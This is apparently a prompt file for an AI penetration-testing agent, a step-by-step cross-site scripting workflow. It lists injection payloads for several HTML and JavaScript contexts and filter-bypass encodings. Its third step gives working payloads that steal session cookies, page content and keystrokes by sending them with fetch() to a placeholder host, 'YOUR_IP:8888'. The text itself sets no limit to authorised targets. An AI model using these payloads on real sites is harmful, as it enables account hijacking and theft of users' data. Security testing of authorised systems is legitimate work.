"""
XSS Attack Skill Prompt.
"""

XSS_SKILL_PROMPT = """
## ATTACK SKILL: CROSS-SITE SCRIPTING (XSS)

**CRITICAL: Target shows signs of reflected/stored input.**
**Follow this workflow for XSS testing.**

---

### DETECTION: Identify reflection points

A parameter is a CANDIDATE for XSS if:
- Its value appears in the HTML response (reflected input)
- The input is stored and displayed to other users (comments, profiles, messages)
- User-controlled data appears in JavaScript context, HTML attributes, or URL fields

### MANDATORY XSS WORKFLOW

#### STEP 1: CONTEXT DETECTION

Determine WHERE your input appears in the response:
1. **HTML body**: `<div>YOUR_INPUT</div>` → try `<script>alert(1)</script>`
2. **HTML attribute**: `<input value="YOUR_INPUT">` → try `" onfocus=alert(1) autofocus="`
3. **JavaScript string**: `var x = "YOUR_INPUT";` → try `"; alert(1);//`
4. **URL/href**: `<a href="YOUR_INPUT">` → try `javascript:alert(1)`

#### STEP 2: PAYLOAD MATRIX (try in order)

**Basic probes:**
- `<script>alert(1)</script>` — classic
- `<img src=x onerror=alert(1)>` — no script tag needed
- `<svg onload=alert(1)>` — SVG vector
- `<body onload=alert(1)>` — body event

**Attribute breakout (when inside tag attributes):**
- `" autofocus onfocus=alert(1) x="`
- `' onfocus=alert(1) autofocus='`
- `` onclick=alert(1) `` (no quotes needed sometimes)

**Bypass filters:**
- Case variation: `<ScRiPt>alert(1)</sCrIpT>`
- Encoded: `%3Cscript%3Ealert(1)%3C/script%3E`
- Double-encoded: `%253Cscript%253Ealert(1)%253C%252Fscript%253E`
- Null byte: `<scri%00pt>alert(1)</script>`
- Backtick: `<img src=x onerror=&#96;alert(1)&#96;>`

#### STEP 3: CONFIRM EXPLOITABILITY

After getting alert(1):
1. **Cookie steal**: `<script>fetch('http://YOUR_IP:8888/?c='+document.cookie)</script>`
2. **DOM access**: `<script>fetch('http://YOUR_IP:8888/?d='+document.documentElement.innerHTML)</script>`
3. **Keylogger**: `<script>document.onkeypress=function(e){fetch('http://YOUR_IP:8888/?k='+e.key)}</script>`

#### STEP 4: STORED XSS

For stored XSS (comments, profiles):
1. Submit the payload in the stored field
2. Navigate to where the stored data is displayed
3. Check if the payload executes without URL parameters
4. Record: write_note with the payload, injection point, and confirmation

#### ANTI-PATTERNS:
- Do NOT claim XSS unless the payload actually executes JavaScript
- Do NOT stop after `<script>alert(1)</script>` fails — try at least 5 different vectors
- Always test the full context (HTML, attribute, JS, URL) before giving up
- Record every attempt with write_note
"""
